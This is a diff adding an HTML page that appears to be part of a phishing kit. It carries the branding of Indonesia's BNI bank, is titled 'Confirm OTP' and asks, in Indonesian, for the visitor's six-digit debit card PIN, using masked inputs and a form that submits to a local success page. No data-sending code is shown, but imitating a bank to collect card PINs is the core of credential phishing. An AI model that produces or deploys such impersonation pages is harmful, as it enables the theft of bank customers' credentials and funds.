@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm OTP</title>
+    <style>
+        *{
+            padding: 0;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        #header{
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #logo{
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+
+        #logo > img{
+            width: 100px;
+        }
+
+        #illustration{
+            margin-bottom: 40px;
+        }
+
+        #illustration > img{
+            width: 150px;
+        }
+
+        #formContainer{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #form{
+            font-size: 14px;
+        }
+
+        #form > h1, #form > p{
+            text-align: center;
+        }
+
+        #form > h1{
+            font-size: 24px;
+            margin-bottom: 32px;
+        }
+        
+        #otp-form{
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+
+        #otp-form > input{
+            height: 55px;
+            width: 45px;
+            margin-right: 8px;
+            border-radius: 8px;
+            font-size: 32px;
+            text-align: center;
+            border: 1px solid #D0D5DD;
+            color: #FF8736;
+        }
+        
+        #otp-form > input:focus{
+            border: 2px solid #FF8736;
+            box-shadow: none;
+            background: none;
+            outline: none;
+        }
+        
+        #otp-form > input:valid{
+            border: 2px solid #FF8736;
+        }
+
+        .timeout-otp{
+            margin-bottom: 30px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: .5rem;
+        }
+
+        #submitButton{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 96px;
+        }
+        
+        #submitButton > button{
+            color: white;
+            font-size: 16px;
+            /* font-weight: bold; */
+            background-color: #FF8736;
+            border: 1px solid #FF8736;
+            width: 100%;
+            height: 48px;
+            border-radius: 24px;
+        }
+
+        #submitButton > button:hover,
+        #submitButton > button:focus {
+            cursor: pointer;
+            color: rgb(227, 219, 219);
+            background-color: #df7b38;
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+</head>
+<body>
+    <div id="header">
+        <div id="logo">
+            <img src="./images/logo_bni.png">
+        </div>
+        <div id="illustration">
+            <img src="./images/hand-phone.svg">
+        </div>
+    </div>
+    <div id="formContainer">
+        <form id="form" autocomplete="off" action="./success.html">
+            <h1>Masukkan PIN Karu Debit Anda</h1>
+            <div id="otp-form">
+                <input type="password" id="digit-1" name="digit-1" data-next="digit-2" required/>
+                <input type="password" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" required/>
+                <input type="password" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" required/>
+                <input type="password" id="digit-4" name="digit-4" data-next="digit-5" data-previous="digit-3" required/>
+                <input type="password" id="digit-5" name="digit-5" data-next="digit-6" data-previous="digit-4" required/>
+                <input type="password" id="digit-6" name="digit-6" data-previous="digit-5" required/>
+            </div>
+            <div id="submitButton">
+                <button type="submit">Kirim</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        $(document).ready(function(){
+            $('#otp-form').find('input').each(function() {
+                $(this).attr('maxlength', 1);
+                $(this).on('keyup', function(e) {
+                    var parent = $($(this).parent());
+                    
+                    if(e.keyCode === 8 || e.keyCode === 37) {
+                        var prev = parent.find('input#' + $(this).data('previous'));
+                        
+                        if(prev.length) {
+                            $(prev).select();
+                        }
+                    } else if((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 65 && e.keyCode <= 90) || (e.keyCode >= 96 && e.keyCode <= 105) || e.keyCode === 39) {
+                        var next = parent.find('input#' + $(this).data('next'));
+                        
+                        if(next.length) {
+                            $(next).select();
+                        } else {
+                            if(parent.data('autosubmit')) {
+                                parent.submit();
+                            }
+                        }
+                    }
+                });
+            });
+        })
+    </script>
+</body>
+</html>
